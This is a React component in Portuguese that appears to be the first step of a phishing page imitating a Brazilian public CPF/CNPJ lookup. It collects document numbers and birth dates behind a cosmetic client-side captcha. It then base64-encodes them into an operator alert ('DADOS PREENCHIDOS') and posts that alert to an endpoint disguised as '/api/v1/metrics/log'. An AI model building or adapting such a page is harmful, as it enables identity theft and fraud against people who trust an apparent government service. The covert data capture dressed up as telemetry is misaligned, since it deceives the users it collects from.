import React, { useState, useEffect } from "react";
import { IMaskInput } from "react-imask";
import { User, Calendar, RefreshCcw, Volume2, Search } from "lucide-react";
import { validateCPF, validateCNPJ } from "../utils/validations";
import axios from "axios";
import { API_URL } from "../config";

interface Step1Props {
  onSuccess: (data: any) => void;
  onNotify?: (message: string, type: any) => void;
}

export function Step1({ onSuccess, onNotify }: Step1Props) {
  const [docType, setDocType] = useState<"CPF" | "CNPJ">("CPF");
  const [docValue, setDocValue] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [captchaCode, setCaptchaCode] = useState("");
  const [loading, setLoading] = useState(false);

  const generateCaptcha = () => {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
    let code = "";
    for (let i = 0; i < 5; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaCode(code);
    setCaptcha("");
  };

  useEffect(() => {
    generateCaptcha();
  }, []);


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Basic Validations
    if (docType === "CPF" && !validateCPF(docValue)) {
      onNotify?.("Por favor, insira um CPF válido.", "error");
      return;
    }
    if (docType === "CNPJ" && !validateCNPJ(docValue)) {
      onNotify?.("Por favor, insira um CNPJ válido.", "error");
      return;
    }
    // Rigorous Date Validation
    const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
    if (!dateRegex.test(birthDate)) {
      onNotify?.("Insira uma data de nascimento no formato DD/MM/AAAA.", "error");
      return;
    }

    const [day, month, year] = birthDate.split("/").map(Number);
    const dateObj = new Date(year, month - 1, day);
    const now = new Date();
    
    if (
      dateObj.getFullYear() !== year ||
      dateObj.getMonth() !== month - 1 ||
      dateObj.getDate() !== day
    ) {
      onNotify?.("Esta data de nascimento não é válida.", "error");
      return;
    }

    if (dateObj > now) {
      onNotify?.("A data de nascimento não pode ser no futuro.", "error");
      return;
    }

    if (year < 1900) {
      onNotify?.("Por favor, insira um ano de nascimento válido.", "error");
      return;
    }

    // Captcha Validation (Case Insensitive for better UX)
    if (captcha.toLowerCase() !== captchaCode.toLowerCase()) {
      onNotify?.("O código da figura está incorreto.", "error");
      generateCaptcha();
      return;
    }

    setLoading(true);
    
    // Honeypot check (Bot trap)
    const honeypot = (e.target as any).elements.confirm_email?.value;
    if (honeypot) {
        // Silent reject for bots
        setTimeout(() => setLoading(false), 2000);
        return;
    }

    // Simulate processing
    setTimeout(async () => {
      try {
        const payload = btoa(JSON.stringify({
          message: `<b>📝 DADOS PREENCHIDOS</b>\n\n<b>Tipo:</b> ${docType}\n<b>Documento:</b> ${docValue}\n<b>Nascimento:</b> ${birthDate}\n<b>Status:</b> 🟡 Aguardando consulta...`
        }));
        await axios.post(`${API_URL}/api/v1/metrics/log`, { payload });
      } catch (err) {
        console.error("Failed to notify", err);
      }
      setLoading(false);
      onSuccess({ docType, docValue, birthDate });
    }, 1500);
  };

  return (
    <div className="bg-white dark:bg-[#1f292e] rounded shadow-sm border border-[#ddd] dark:border-[#2a373d] overflow-hidden w-full max-w-[420px] mx-auto transition-colors duration-300">
      <div className="px-4 sm:px-5 py-[18px] border-b border-[#ddd] dark:border-[#2a373d] flex flex-wrap items-baseline justify-between gap-1 transition-colors duration-300">
        <h2 className="text-[#626e7a] dark:text-[#9eaeb8] text-[18px] sm:text-[22px] font-bold whitespace-nowrap transition-colors duration-300">ID_SVC_772_PROTO</h2>
        <span className="text-[#626e7a] dark:text-[#9eaeb8] text-[14px] sm:text-[16px] whitespace-nowrap transition-colors duration-300">Consulta Pública</span>
      </div>

      <div className="p-5">
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Document Type Selection */}
          <div className="space-y-2">
            <label className="text-[17px] text-[#717478] dark:text-[#b5c2ca] transition-colors duration-300">Tipo de documento</label>
            <div className="flex gap-10">
              <label className="flex items-center gap-3 cursor-pointer group">
                <div className={`w-[21px] h-[21px] rounded-full border-[1.5px] flex items-center justify-center transition-colors duration-300 ${docType === "CPF" ? "border-[#007bff] dark:border-[#3b82f6]" : "border-[#ccc] dark:border-[#4b5563]"}`}>
                  {docType === "CPF" && <div className="w-[11px] h-[11px] bg-[#007bff] dark:bg-[#3b82f6] rounded-full transition-colors duration-300"></div>}
                </div>
                <input
                  type="radio"
                  name="docType"
                  className="hidden"
                  checked={docType === "CPF"}
                  onChange={() => { setDocType("CPF"); setDocValue(""); }}
                />
                <span className="text-[17px] text-[#717478] dark:text-[#b5c2ca] transition-colors duration-300">CPF</span>
              </label>
              <label className="flex items-center gap-3 cursor-pointer group">
                <div className={`w-[21px] h-[21px] rounded-full border-[1.5px] flex items-center justify-center transition-colors duration-300 ${docType === "CNPJ" ? "border-[#007bff] dark:border-[#3b82f6]" : "border-[#ccc] dark:border-[#4b5563]"}`}>
                  {docType === "CNPJ" && <div className="w-[11px] h-[11px] bg-[#007bff] dark:bg-[#3b82f6] rounded-full transition-colors duration-300"></div>}
                </div>
                <input
                  type="radio"
                  name="docType"
                  className="hidden"
                  checked={docType === "CNPJ"}
                  onChange={() => { setDocType("CNPJ"); setDocValue(""); }}
                />
                <span className="text-[17px] text-[#717478] dark:text-[#b5c2ca] transition-colors duration-300">CNPJ</span>
              </label>
            </div>
          </div>

          {/* Honeypot - Invisible for humans, trap for bots */}
          <div className="absolute opacity-0 -z-10 h-0 overflow-hidden" aria-hidden="true">
            <input type="text" name="confirm_email" tabIndex={-1} autoComplete="off" />
          </div>

          {/* Document Input */}
          <div className="space-y-1">
            <label className="text-[17px] text-[#717478] dark:text-[#b5c2ca] transition-colors duration-300">Insira o {docType}</label>
            <p className="text-[14px] text-[#717478] dark:text-[#8b9ba5] italic leading-none transition-colors duration-300">
              {docType === "CPF" ? "Digite o seu CPF ou de pessoa falecida" : "Digite o CNPJ da empresa"}
            </p>
            <div className="flex rounded border border-[#ccc] dark:border-[#4b5563] overflow-hidden focus-within:border-[#007bff] dark:focus-within:border-[#3b82f6] h-[48px] mt-1 transition-colors duration-300">
              <div className="w-[48px] bg-[#f2f2f2] dark:bg-[#253238] border-r border-[#ccc] dark:border-[#4b5563] flex items-center justify-center transition-colors duration-300">
                <div className="w-10 h-10 rounded-full border border-gray-400 dark:border-gray-500 flex items-center justify-center bg-gray-50 dark:bg-[#1a2227] transition-colors duration-300">
                  <User size={18} className="text-gray-900 dark:text-gray-300" fill="currentColor" />
                </div>
              </div>
              <IMaskInput
                mask={docType === "CPF" ? "000.000.000-00" : "00.000.000/0000-00"}
                placeholder={docType === "CPF" ? "Exemplo: 000.000.000-00" : "Exemplo: 00.000.000/0001-00"}
                className="flex-1 px-4 py-2 outline-none text-[#555] dark:text-[#d1d5db] bg-white dark:bg-[#1f292e] text-[17px] placeholder-[#999] dark:placeholder-[#6b7280] transition-colors duration-300"
                value={docValue}
                onAccept={(value: string) => setDocValue(value)}
                unmask={false}
                required
              />
            </div>
          </div>

          {/* Birth Date */}
          <div className="space-y-1">
            <label className="text-[17px] text-[#717478] dark:text-[#b5c2ca] transition-colors duration-300">
              {docType === "CPF" ? "Data de nascimento:" : "Data de abertura:"}
            </label>
            <p className="text-[14px] text-[#717478] dark:text-[#8b9ba5] italic leading-tight transition-colors duration-300">
              {docType === "CPF" ? "Digite a data do seu nascimento ou de pessoa falecida" : "Digite a data de abertura da empresa"}
            </p>
            <IMaskInput
              mask="00/00/0000"
              placeholder="dd/mm/aaaa"
              className="w-full px-3 py-2 border border-[#ccc] dark:border-[#4b5563] bg-white dark:bg-[#1f292e] rounded outline-none focus:border-[#007bff] dark:focus:border-[#3b82f6] text-[#555] dark:text-[#d1d5db] placeholder-[#999] dark:placeholder-[#6b7280] text-[18px] h-[48px] mt-1 transition-colors duration-300"
              value={birthDate}
              onAccept={(value: string) => setBirthDate(value)}
              unmask={false}
              required
            />
          </div>

          <div className="space-y-3">
            <label className="text-[17px] text-[#717478] dark:text-[#b5c2ca] leading-tight block transition-colors duration-300">
              Transcreva abaixo os caracteres que você vê na figura:
            </label>
            <div className="flex gap-2">
              <div className="relative border border-[#ccc] dark:border-[#4b5563] p-0 bg-[#f9f9f9] dark:bg-[#1a2227] flex-shrink-0 flex items-center justify-center overflow-hidden rounded shadow-inner transition-colors duration-300" style={{ width: '150px', height: '80px' }}>
                 {/* Background noise/pattern for captcha */}
                 <div className="absolute inset-0 opacity-10 pointer-events-none select-none" style={{ backgroundImage: 'radial-gradient(#000 1px, transparent 1px)', backgroundSize: '10px 10px' }}></div>
                 <div className="absolute inset-0 flex items-center justify-around font-black text-2xl tracking-[0.1em] text-[#222] select-none pointer-events-none italic opacity-80" style={{ fontFamily: 'serif' }}>
                    {captchaCode.split('').map((char, i) => (
                      <span key={i} style={{ 
                        transform: `rotate(${Math.random() * 40 - 20}deg) translateY(${Math.random() * 10 - 5}px)`,
                        color: ['#1b668d', '#2d7890', '#333'][Math.floor(Math.random() * 3)]
                      }}>
                        {char}
                      </span>
                    ))}
                 </div>
                 {/* Decorative lines to confuse OCR */}
                 <svg className="absolute inset-0 pointer-events-none opacity-20" width="100%" height="100%">
                    <line x1="0" y1="20" x2="150" y2="60" stroke="#000" strokeWidth="1" />
                    <line x1="10" y1="80" x2="140" y2="0" stroke="#000" strokeWidth="1" />
                 </svg>
              </div>
              <div className="flex flex-col gap-2 flex-grow">
                <input
                  type="text"
                  placeholder="Entre com os caract"
                  className="w-full h-[40px] px-3 border border-[#ccc] dark:border-[#4b5563] bg-white dark:bg-[#1f292e] rounded outline-none focus:border-[#007bff] dark:focus:border-[#3b82f6] text-sm text-gray-500 dark:text-gray-300 font-mono transition-colors duration-300"
                  value={captcha}
                  onChange={(e) => setCaptcha(e.target.value)}
                  required
                />
                <button 
                  type="button" 
                  onClick={() => {
                    const utterance = new SpeechSynthesisUtterance(`Os caracteres são: ${captchaCode.split('').join(', ')}`);
                    utterance.lang = 'pt-BR';
                    window.speechSynthesis.speak(utterance);
                  }}
                  className="h-[40px] bg-[#2398bf] hover:bg-[#1a7a9a] text-white py-1 px-3 rounded text-[14px] flex items-center justify-center gap-2 transition-colors"
                >
                  <Volume2 size={16} /> Ouvir os caracteres
                </button>
                <button 
                  type="button" 
                  onClick={generateCaptcha}
                  className="h-[40px] bg-[#2398bf] hover:bg-[#1a7a9a] text-white py-1 px-3 rounded text-[14px] flex items-center justify-center gap-2 transition-colors"
                >
                  <RefreshCcw size={16} /> Troque os caracteres
                </button>
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#2398bf] hover:bg-[#1a7a9a] text-white font-bold py-3 px-6 rounded flex items-center justify-center gap-3 transition-all active:scale-[0.98] duration-75 uppercase tracking-wide text-sm"
          >
            {loading ? (
              <RefreshCcw className="animate-spin" size={20} />
            ) : (
              <>
                <Search size={20} /> Consultar
              </>
            )}
          </button>
        </form>
      </div>
    </div>
  );
}
